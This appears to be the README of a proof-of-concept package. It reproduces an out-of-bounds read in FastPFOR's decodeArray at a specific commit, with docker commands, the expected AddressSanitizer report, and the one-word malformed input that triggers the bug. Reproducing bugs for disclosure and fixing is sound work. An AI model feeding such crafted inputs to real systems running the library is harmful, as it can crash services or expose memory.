# FastPFOR decodeArray out-of-bounds read PoC

This package reproduces an out-of-bounds read in `fast-pack/FastPFOR` at commit
`2457e1ed1af35bbf7f4c509c863fa9797e637cb3`.

## Build and run

```sh
docker build -t poc-fastpfor-oob-read .
docker run --rm poc-fastpfor-oob-read
```

## Expected vulnerable behavior

AddressSanitizer should report an out-of-bounds read or invalid read in the
`FastPFor<>::decodeArray()` / `FastPForImpl::__decodeArray()` path.

## Trigger

The PoC supplies a one-word compressed stream:

```cpp
uint8_t raw[4] = {1, 0, 0, 0};
```

This makes `decodeArray()` believe one output value should be decoded, but the
compressed input has no valid metadata following the first length word.
